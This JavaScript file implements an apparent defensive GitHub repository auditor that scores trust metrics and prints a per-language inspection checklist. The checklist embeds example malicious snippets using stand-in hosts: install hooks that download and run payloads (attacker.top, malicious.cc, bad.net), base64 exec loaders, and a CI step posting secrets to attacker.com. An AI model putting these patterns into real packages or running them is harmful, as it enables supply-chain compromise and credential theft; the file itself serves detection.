/**
 * SentinelOps - DevSecOps Analyst & Source Code Auditor Engine
 * Evaluates public GitHub repositories for supply chain threats,
 * malware droppers, brand spoofing, and malicious install hooks.
 */

const RepoAuditor = (() => {

  /**
   * Parse GitHub URL into { owner, repo }
   */
  function parseGitHubUrl(url) {
    if (!url) return null;
    const clean = url.trim().replace(/\/$/, '');
    const match = clean.match(/github\.com\/([^\/]+)\/([^\/\?#]+)/i);
    if (match) {
      return {
        owner: match[1],
        repo: match[2].replace(/\.git$/i, '')
      };
    }
    return null;
  }

  /**
   * Fetch live repository metrics from public GitHub API
   */
  async function fetchLiveRepo(url) {
    const parsed = parseGitHubUrl(url);
    if (!parsed) {
      throw new Error('Invalid GitHub repository URL format. Expected: https://github.com/owner/repo');
    }

    try {
      const repoRes = await fetch(`https://api.github.com/repos/${parsed.owner}/${parsed.repo}`, {
        headers: { 'Accept': 'application/vnd.github.v3+json' }
      });

      if (!repoRes.ok) {
        if (repoRes.status === 404) {
          throw new Error(`Repository '${parsed.owner}/${parsed.repo}' not found (HTTP 404). It may be private, deleted, or suspended.`);
        } else if (repoRes.status === 403) {
          throw new Error('GitHub API rate limit exceeded for your IP. Manual metrics entry can be used.');
        } else {
          throw new Error(`GitHub API returned error: HTTP ${repoRes.status}`);
        }
      }

      const repoData = await repoRes.json();

      // Fetch owner details to find account creation date
      let accountCreatedAt = null;
      try {
        const userRes = await fetch(repoData.owner.url, {
          headers: { 'Accept': 'application/vnd.github.v3+json' }
        });
        if (userRes.ok) {
          const userData = await userRes.json();
          accountCreatedAt = userData.created_at;
        }
      } catch (e) {
        // Fallback if user lookup fails
      }

      return {
        success: true,
        repoUrl: repoData.html_url,
        repoName: repoData.name,
        owner: repoData.owner.login,
        stars: repoData.stargazers_count,
        forks: repoData.forks_count,
        watchers: repoData.watchers_count,
        openIssues: repoData.open_issues_count,
        primaryLanguage: repoData.language || 'Generic',
        repoCreatedAt: repoData.created_at,
        accountCreatedAt: accountCreatedAt || 'Unknown',
        pushedAt: repoData.pushed_at,
        license: repoData.license ? repoData.license.spdx_id : 'None',
        description: repoData.description || 'No description provided.',
        isFork: repoData.fork,
        archived: repoData.archived
      };
    } catch (err) {
      return {
        success: false,
        error: err.message
      };
    }
  }

  /**
   * Convert relative or string date into approximate age in days
   */
  function parseDateToDays(dateStr) {
    if (!dateStr) return 30;
    const text = dateStr.toLowerCase().trim();

    // Check ISO format
    const parsedDate = new Date(dateStr);
    if (!isNaN(parsedDate.getTime())) {
      const now = new Date();
      const diffMs = now - parsedDate;
      return Math.max(1, Math.floor(diffMs / (1000 * 60 * 60 * 24)));
    }

    // Check relative format
    if (text.includes('today') || text.includes('hour')) return 1;
    if (text.includes('yesterday')) return 2;
    if (text.includes('day')) {
      const m = text.match(/(\d+)\s*day/);
      return m ? parseInt(m[1]) : 3;
    }
    if (text.includes('week')) {
      const m = text.match(/(\d+)\s*week/);
      return m ? parseInt(m[1]) * 7 : 14;
    }
    if (text.includes('month')) {
      const m = text.match(/(\d+)\s*month/);
      return m ? parseInt(m[1]) * 30 : 60;
    }
    if (text.includes('year')) {
      const m = text.match(/(\d+)\s*year/);
      return m ? parseInt(m[1]) * 365 : 365;
    }

    return 30; // default fallback
  }

  /**
   * Calculate Trust Score (1 to 10) based on repository metrics
   */
  function calculateTrustScore(metrics) {
    const stars = parseInt(metrics.stars) || 0;
    const forks = parseInt(metrics.forks) || 0;
    const accountDays = parseDateToDays(metrics.accountDate);
    const repoDays = parseDateToDays(metrics.repoDate);
    const lang = (metrics.language || '').toLowerCase();

    let score = 5.0; // neutral starting baseline
    const deductions = [];
    const bonuses = [];

    // 1. Account Age Longevity
    if (accountDays < 7) {
      score -= 2.5;
      deductions.push(`Disposable Account (-2.5): GitHub user profile was registered only ${accountDays} day(s) ago.`);
    } else if (accountDays < 30) {
      score -= 1.5;
      deductions.push(`Infant Account (-1.5): User account is less than a month old (${accountDays} days).`);
    } else if (accountDays > 730) { // 2+ years
      score += 1.5;
      bonuses.push(`Account Seniority (+1.5): Maintainer profile has been active for ${Math.round(accountDays / 365)} years.`);
    } else if (accountDays > 180) {
      score += 0.8;
      bonuses.push(`Established Account (+0.8): Maintainer profile is ${Math.round(accountDays / 30)} months old.`);
    }

    // 2. Repository Age
    if (repoDays <= 3) {
      score -= 2.0;
      deductions.push(`Brand New Repository (-2.0): Created within the last ${repoDays} day(s). High correlation with disposable malware distribution campaigns.`);
    } else if (repoDays < 14) {
      score -= 1.0;
      deductions.push(`Recent Repository (-1.0): Created within the past 2 weeks (${repoDays} days).`);
    } else if (repoDays > 365) {
      score += 1.5;
      bonuses.push(`Repo Longevity (+1.5): Repository has existed for over a year with public version history.`);
    }

    // 3. Temporal Synchronicity Anomaly (Account created immediately before repo)
    if (Math.abs(accountDays - repoDays) <= 2 && accountDays < 14) {
      score -= 1.5;
      deductions.push(`Syndicate Burner Pattern (-1.5): Account and repository were initialized almost simultaneously, typical of single-purpose malware drop operations.`);
    }

    // 4. Star-to-Fork Ratio & Engagement Anomaly
    if (stars > 100 && forks === 0) {
      score -= 2.0;
      deductions.push(`Artificial Star Farming (-2.0): Repository boasts ${stars} stars with 0 forks. High probability of purchased bot engagement.`);
    } else if (stars > 500 && (forks / stars) < 0.02) {
      score -= 1.0;
      deductions.push(`Abnormal Engagement Velocity (-1.0): Very low fork-to-star ratio (${forks}/${stars}), indicating inorganic or manipulated popularity.`);
    } else if (stars >= 50 && forks >= 10) {
      score += 1.0;
      bonuses.push(`Organic Community Forking (+1.0): Healthy ratio of ${stars} stars to ${forks} forks.`);
    } else if (stars >= 1000 && forks >= 100) {
      score += 2.0;
      bonuses.push(`High Trust Global OSS (+2.0): Extensively audited with ${stars.toLocaleString()} stars and ${forks.toLocaleString()} forks.`);
    } else if (stars <= 2 && repoDays <= 7) {
      score -= 0.5;
      deductions.push(`Unverified Codebase (-0.5): Zero or near-zero peer reviews (${stars} stars).`);
    }

    // 5. Language Security Surface
    if (lang.includes('python')) {
      // Python setup.py and wheels have high arbitrary code execution surface
      score -= 0.2;
    } else if (lang.includes('javascript') || lang.includes('typescript') || lang.includes('node')) {
      // npm lifecycle hooks are primary targets for supply chain theft
      score -= 0.2;
    }

    // Clamp score strictly between 1.0 and 10.0
    const finalScore = Math.max(1.0, Math.min(10.0, Math.round(score * 10) / 10));

    let ratingTier = 'CRITICAL RISK';
    let badgeColor = 'bg-rose-600 text-white';
    let textColor = 'text-rose-400';

    if (finalScore >= 8.0) {
      ratingTier = 'HIGH TRUST / REPUTABLE';
      badgeColor = 'bg-emerald-500 text-slate-950 font-bold';
      textColor = 'text-emerald-400';
    } else if (finalScore >= 6.0) {
      ratingTier = 'MODERATE TRUST / PROCEED WITH STANDARD AUDIT';
      badgeColor = 'bg-cyan-500 text-slate-950';
      textColor = 'text-cyan-400';
    } else if (finalScore >= 4.0) {
      ratingTier = 'ELEVATED SUSPICION / MANUAL REVIEW REQUIRED';
      badgeColor = 'bg-amber-500 text-slate-950';
      textColor = 'text-amber-400';
    } else {
      ratingTier = 'CRITICAL RISK / UNTRUSTED REPOSITORY';
      badgeColor = 'bg-rose-600 text-white animate-pulse';
      textColor = 'text-rose-400';
    }

    return {
      score: finalScore,
      ratingTier: ratingTier,
      badgeColor: badgeColor,
      textColor: textColor,
      deductions: deductions,
      bonuses: bonuses
    };
  }

  /**
   * Analyze Suspicious Indicators
   */
  function analyzeSuspiciousIndicators(metrics) {
    const stars = parseInt(metrics.stars) || 0;
    const forks = parseInt(metrics.forks) || 0;
    const accountDays = parseDateToDays(metrics.accountDate);
    const repoDays = parseDateToDays(metrics.repoDate);
    const repoName = (metrics.repoName || '').toLowerCase();
    const repoUrl = (metrics.repoUrl || '').toLowerCase();

    const indicators = [];

    // Check 1: Brand Spoofing / Typosquatting in repo name
    const SPOOF_TARGETS = ['metamask', 'phantom', 'solana', 'chatgpt', 'cheatengine', 'cheat-engine', 'fortnite', 'roblox', 'autobuyer', 'sniperbot', 'crypto-drainer', 'discord-nitro', 'trading-bot'];
    for (const target of SPOOF_TARGETS) {
      if (repoName.includes(target) && stars < 50) {
        indicators.push({
          type: 'Brand Impersonation / Lure Keyword',
          severity: 'CRITICAL',
          description: `Repository name contains high-value financial/gaming lure keyword '${target}'. Threat actors frequently name repositories after popular tools, cheats, or crypto bots to lure targets searching GitHub.`
        });
        break;
      }
    }

    // Check 2: Low Stars + Infant Creation
    if (stars <= 5 && repoDays <= 7) {
      indicators.push({
        type: 'Zero-Reputation Malware Dropper Profile',
        severity: 'HIGH',
        description: `Repository is only ${repoDays} day(s) old with merely ${stars} stars. This represents the textbook profile of disposable campaign droppers designed to be deleted within hours once flagged.`
      });
    }

    // Check 3: Sudden Activity / Bot Star Farming
    if (stars > 200 && forks <= 2) {
      indicators.push({
        type: 'Artificially Inflated Metric (Star Farming)',
        severity: 'HIGH',
        description: `Glaring disparity between ${stars} stars and only ${forks} fork(s). Genuine open-source projects of this star tier attract forks, issues, and pull requests. Lack of engagement indicates automated bot-starring services were purchased to fabricate legitimacy.`
      });
    }

    // Check 4: Burner Account Synchronization
    if (accountDays <= 5 && repoDays <= 5) {
      indicators.push({
        type: 'Burner Infrastructure Deployment',
        severity: 'HIGH',
        description: `Maintainer account was registered virtually on the same day the repository was created. Legitimate software authors usually possess accounts with verifiable contribution graphs and historical activity.`
      });
    }

    // Check 5: Package Typosquatting
    const KNOWN_PACKAGES = ['express', 'lodash', 'requests', 'axios', 'flask', 'react', 'next', 'django', 'pandas', 'numpy'];
    for (const pkg of KNOWN_PACKAGES) {
      if (repoName !== pkg && repoName.replace(/[-_]/g, '') === pkg) {
        indicators.push({
          type: 'Supply Chain Typosquatting Risk',
          severity: 'CRITICAL',
          description: `Repository name '${metrics.repoName}' closely resembles prominent package '${pkg}'. Attackers upload typo packages to trick developers during manual CLI installations.`
        });
      }
    }

    return indicators;
  }

  /**
   * Generate Context-Aware Code Inspection Checklist by Language
   */
  function getCodeInspectionChecklist(language) {
    const lang = (language || 'Generic').toLowerCase();
    const checklist = [];

    // 1. Language-Specific File Targets
    if (lang.includes('python')) {
      checklist.push({
        file: 'setup.py / setup.cfg / pyproject.toml',
        priority: 'CRITICAL (Priority #1)',
        reason: 'Arbitrary code executes AUTOMATICALLY during `pip install .` via setuptools custom command classes.',
        inspectionSteps: [
          'Search for overridden `install`, `develop`, or `build_py` classes inside `cmdclass={...}`.',
          'Check for `subprocess.Popen`, `os.system()`, `requests.post()`, or `socket` imports in `setup.py`.',
          'Inspect `install_requires` for typosquatted or external unverified package dependencies.'
        ],
        codeSnippet: `# DANGEROUS PATTERN in setup.py:
from setuptools import setup
from setuptools.command.install import install
import urllib.request, subprocess

class PostInstall(install):
    def run(self):
        # Stealer executes upon 'pip install'
        urllib.request.urlretrieve("https://attacker.top/payload.exe", "tmp.exe")
        subprocess.Popen(["tmp.exe"])
        install.run(self)`
      });

      checklist.push({
        file: '__init__.py & top-level modules',
        priority: 'HIGH',
        reason: 'Executes upon package import (`import pkg`). Common location for stealthy token exfiltration.',
        inspectionSteps: [
          'Search for obfuscated base64 strings: `base64.b64decode("...")` wrapped in `exec()` or `eval()`.',
          'Look for Discord Webhook URLs (`discord.com/api/webhooks/`) or Telegram Bot API exfiltration endpoints.',
          'Verify if code scans `os.environ` for AWS credentials (`AWS_SECRET_ACCESS_KEY`), GitHub tokens, or SSH keys.'
        ],
        codeSnippet: `# DANGEROUS PATTERN in __init__.py:
import base64
exec(base64.b64decode(b'aW1wb3J0IG9zCnJl...') # Hidden memory execution`
      });
    } else if (lang.includes('javascript') || lang.includes('typescript') || lang.includes('node')) {
      checklist.push({
        file: 'package.json (Lifecycle Scripts)',
        priority: 'CRITICAL (Priority #1)',
        reason: 'npm scripts execute AUTOMATICALLY upon running `npm install` before you ever run the application.',
        inspectionSteps: [
          'Inspect the `"scripts"` block for `"preinstall"`, `"install"`, or `"postinstall"` hooks.',
          'Look for commands invoking `curl`, `wget`, `powershell`, or `node -e "..."`.',
          'Review `"dependencies"` and `"devDependencies"` for lookalike packages or git URLs pointing to personal forks.'
        ],
        codeSnippet: `// DANGEROUS PATTERN in package.json:
{
  "name": "legit-looking-lib",
  "scripts": {
    "postinstall": "node -e \\"require('https').get('https://malicious.cc/drop.js',r=>{r.pipe(process.stdout)})\\""
  }
}`
      });

      checklist.push({
        file: 'index.js / bundle.js / minified sources',
        priority: 'HIGH',
        reason: 'Obfuscated javascript payloads hiding info-stealers (browsers cookies, Metamask seed phrases).',
        inspectionSteps: [
          'Check for JavaScript obfuscators (hex arrays, `_0x1a2b`, high Shannon entropy strings).',
          'Inspect filesystem access targeting Chrome `Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn` (MetaMask ID).',
          'Audit outbound network calls via `fetch()`, `axios`, or native `http/https`.'
        ],
        codeSnippet: `// DANGEROUS PATTERN in index.js:
const _0x5a1b = ["\\x77\\x65\\x62\\x68\\x6f\\x6f\\x6b"];
eval(Buffer.from("...", "base64").toString());`
      });
    } else if (lang.includes('go')) {
      checklist.push({
        file: 'go.mod & vendor/',
        priority: 'HIGH',
        reason: 'Dependency confusion or vendored binary replacements.',
        inspectionSteps: [
          'Inspect `replace` directives in `go.mod` redirecting trusted packages to attacker-controlled forks.',
          'Inspect `init()` functions inside internal packages, as they execute automatically at startup.',
          'Check CGO directives (`#cgo LDFLAGS:`) that link external shared libraries.'
        ],
        codeSnippet: `// DANGEROUS PATTERN in Go:
func init() {
    exec.Command("powershell", "-c", "iex (iwr ...).Content").Start()
}`
      });
    } else if (lang.includes('rust')) {
      checklist.push({
        file: 'build.rs (Cargo Build Scripts)',
        priority: 'CRITICAL (Priority #1)',
        reason: '`build.rs` executes host native code on the developer\'s machine when running `cargo build`.',
        inspectionSteps: [
          'Inspect `build.rs` for network access (`reqwest`, `curl`) or executing host shell commands (`Command::new(...)`).',
          'Verify procedural macros (`proc-macro`), which also execute compiler-time code in memory.'
        ],
        codeSnippet: `// DANGEROUS PATTERN in build.rs:
fn main() {
    std::process::Command::new("curl")
        .args(&["https://bad.net/stealer.sh", "-o", "/tmp/s.sh"])
        .output().unwrap();
}`
      });
    }

    // Universal Targets for all languages
    checklist.push({
      file: 'Release Assets & Compiled Binaries (.exe, .dll, .so, .bin, .zip)',
      priority: 'CRITICAL',
      reason: 'GitHub releases or repository commits containing pre-compiled binaries are the primary infection vector for developers.',
      inspectionSteps: [
        'Never run pre-compiled releases. Always compile from audited source code.',
        'Upload any pre-compiled binaries to VirusTotal (virustotal.com) or Hybrid-Analysis before execution.',
        'Inspect `.gitattributes` or git history for disguised binaries renamed to `.png`, `.dat`, or `.mp4`.'
      ],
      codeSnippet: `ATTACK VECTOR:
Author commits "build/release.exe" or hosts a ZIP in GitHub Releases.
Often signed with stolen/self-signed certificates to bypass SmartScreen.`
    });

    checklist.push({
      file: '.github/workflows/ (GitHub Actions CI/CD)',
      priority: 'HIGH',
      reason: 'Workflows can exfiltrate developer environment secrets, poison release tags, or mine crypto.',
      inspectionSteps: [
        'Inspect YAML files for `curl | sh`, secret forwarding to external webhooks, or third-party untrusted actions (`uses: untrusted/action@master`).',
        'Check for `pull_request_target` triggers which allow unauthorized PR submitters to steal repo secrets.'
      ],
      codeSnippet: `# DANGEROUS PATTERN in .github/workflows/build.yml:
steps:
  - run: curl -X POST -d "$SECRETS" https://attacker.com/leak`
    });

    return checklist;
  }

  /**
   * Identify General Red Flags typical of malicious repositories
   */
  function identifyRedFlags(metrics) {
    return [
      {
        title: 'Fake README Download Links with Password-Protected Archives',
        badge: 'CRITICAL INDICATOR',
        color: 'rose',
        explanation: 'README instructs users: "Download the executable from Mega.nz / Google Drive / MediaFire — Password: 1234". Cybercriminals place passwords on ZIP archives specifically to prevent Google Drive and automated cloud antivirus engines from inspecting the malicious payload inside.'
      },
      {
        title: 'Heavily Obfuscated or Base64 Piped Payloads',
        badge: 'HIGH INDICATOR',
        color: 'rose',
        explanation: 'Legitimate open-source projects have no reason to hide their source code behind layers of Base64, Hexadecimal, or commercial packers. Heavy obfuscation inside install scripts indicates intent to conceal malicious commands from human reviewers.'
      },
      {
        title: 'Discord Webhook or Telegram Bot Exfiltration Handlers',
        badge: 'HIGH INDICATOR',
        color: 'amber',
        explanation: 'Info-stealers (e.g. BlankGrabber, W4SP, Luna Stealer) use legitimate APIs like Discord Webhooks or Telegram bots to exfiltrate victims\' Chrome passwords, crypto seed phrases, and Discord tokens without triggering outbound corporate firewall alerts.'
      },
      {
        title: 'Manipulated / Bot-Purchased Star Count (Star Farming)',
        badge: 'MEDIUM INDICATOR',
        color: 'amber',
        explanation: 'Repositories with hundreds of stars accrued over 48 hours, but with zero open issues, zero forks, and single-commit history, are using underground botting services to game GitHub\'s trending page.'
      },
      {
        title: 'Brand Impersonation & Typosquatted Utility Names',
        badge: 'HIGH INDICATOR',
        color: 'rose',
        explanation: 'Spoofing famous tool names (e.g. `cheat-engine-2026-free`, `chatgpt-desktop-cracked`, `tradingview-indicator-bot`) designed to ensnare non-technical users looking for free or cracked software.'
      }
    ];
  }

  /**
   * Generate DevSecOps Safe Action Protocol & Sandbox Commands
   */
  function generateSafeActionProtocol(metrics, trustScore) {
    const lang = (metrics.language || '').toLowerCase();
    const isSafe = trustScore.score >= 8.0;
    const isDangerous = trustScore.score <= 4.0;

    const commands = [];

    // Safe install commands
    if (lang.includes('python')) {
      commands.push({
        title: 'Inspect Package Dependencies Without Executing Code',
        command: `pip download --no-deps --no-build-isolation -d ./quarantine ${metrics.repoName || '<package_name>'}`
      });
      commands.push({
        title: 'Scan Source Code with Static Analysis (Semgrep)',
        command: `semgrep --config "p/security-audit" --config "p/secrets" ./`
      });
    } else if (lang.includes('javascript') || lang.includes('node')) {
      commands.push({
        title: 'Install Dependencies with Lifecycle Scripts STRICTLY DISABLED',
        command: `npm install --ignore-scripts`
      });
      commands.push({
        title: 'Audit npm package health & supply-chain vulnerabilities',
        command: `npx socket-cli info ${metrics.repoName || '<pkg>'}`
      });
    }

    commands.push({
      title: 'Run inside an Ephemeral Discardable Docker Container (No Host Volume Mount)',
      command: `docker run --rm -it --network none alpine:latest sh`
    });

    return {
      recommendation: isDangerous ? 'DO NOT EXECUTE - HIGH INFECTION RISK' :
                      (isSafe ? 'APPROVED FOR LOCAL USE UNDER STANDARD VETTING' : 'SANDBOX EXECUTION MANDATORY'),
      summary: isDangerous ?
        'This repository exhibits characteristics of a malicious payload or untrusted supply-chain dropper. Running install commands on your physical workstation is strictly advised against.' :
        'Review code inspection checklist and run in isolated container before merging into production pipelines.',
      quarantineCommands: commands
    };
  }

  /**
   * Main Audit Function
   */
  function auditRepository(metrics) {
    const trustScore = calculateTrustScore(metrics);
    const suspiciousIndicators = analyzeSuspiciousIndicators(metrics);
    const codeChecklist = getCodeInspectionChecklist(metrics.language);
    const redFlags = identifyRedFlags(metrics);
    const safeProtocol = generateSafeActionProtocol(metrics, trustScore);

    const markdownReport = generateMarkdownReport({
      metrics,
      trustScore,
      suspiciousIndicators,
      codeChecklist,
      redFlags,
      safeProtocol
    });

    return {
      metrics: metrics,
      trustScore: trustScore,
      suspiciousIndicators: suspiciousIndicators,
      codeChecklist: codeChecklist,
      redFlags: redFlags,
      safeProtocol: safeProtocol,
      markdownReport: markdownReport,
      timestamp: new Date().toISOString()
    };
  }

  /**
   * Format analysis into exact Markdown report matching prompt
   */
  function generateMarkdownReport(data) {
    let indicatorsText = '';
    if (data.suspiciousIndicators.length === 0) {
      indicatorsText = 'No overt anomaly patterns detected in public repository metrics.\n';
    } else {
      data.suspiciousIndicators.forEach((ind, i) => {
        indicatorsText += `${i + 1}. **[${ind.severity}] ${ind.type}**: ${ind.description}\n`;
      });
    }

    let checklistText = '';
    data.codeChecklist.forEach((chk, i) => {
      checklistText += `#### Target ${i + 1}: \`${chk.file}\` (${chk.priority})\n`;
      checklistText += `- **Risk Vector:** ${chk.reason}\n`;
      checklistText += `- **Inspection Procedures:**\n`;
      chk.inspectionSteps.forEach(s => {
        checklistText += `  * ${s}\n`;
      });
      checklistText += `\n\`\`\`${data.metrics.language.toLowerCase().includes('python') ? 'python' : 'json'}\n${chk.codeSnippet}\n\`\`\`\n\n`;
    });

    let redFlagsText = '';
    data.redFlags.forEach((rf, i) => {
      redFlagsText += `${i + 1}. **${rf.title}** (${rf.badge})\n   ${rf.explanation}\n`;
    });

    let commandsText = '';
    data.safeProtocol.quarantineCommands.forEach(c => {
      commandsText += `- **${c.title}**:\n  \`\`\`bash\n  ${c.command}\n  \`\`\`\n`;
    });

    return `### 📦 DEVSECOPS ANALYST & SOURCE CODE AUDIT REPORT
**Target Repository:** \`${data.metrics.repoName || 'N/A'}\`
**Repository URL:** \`${data.metrics.repoUrl || 'N/A'}\`
**Primary Language:** \`${data.metrics.language || 'Generic'}\`
**Audit Date:** \`${new Date().toUTCString()}\`

---

#### 1. Trust Score
**Rating: ${data.trustScore.score} / 10 (${data.trustScore.ratingTier})**

**Score Breakdown & Deductions:**
${data.trustScore.deductions.map(d => `- ❌ ${d}`).join('\n') || '- None'}
${data.trustScore.bonuses.map(b => `- ✅ ${b}`).join('\n') || ''}

#### 2. Suspicious Indicators Analysis
${indicatorsText}

#### 3. Code Inspection Checklist (Language: ${data.metrics.language})
${checklistText}

#### 4. Red Flags Diagnostic
${redFlagsText}

#### 5. Safe Action & Quarantine Protocol
**Execution Verdict: ${data.safeProtocol.recommendation}**
${data.safeProtocol.summary}

**Sanitized Execution & Quarantine Commands:**
${commandsText}

---
*Generated by SentinelOps DevSecOps Code Auditor Suite*`;
  }

  return {
    auditRepository,
    fetchLiveRepo,
    parseGitHubUrl,
    calculateTrustScore,
    getCodeInspectionChecklist,
    identifyRedFlags
  };
})();

if (typeof module !== 'undefined' && module.exports) {
  module.exports = RepoAuditor;
}
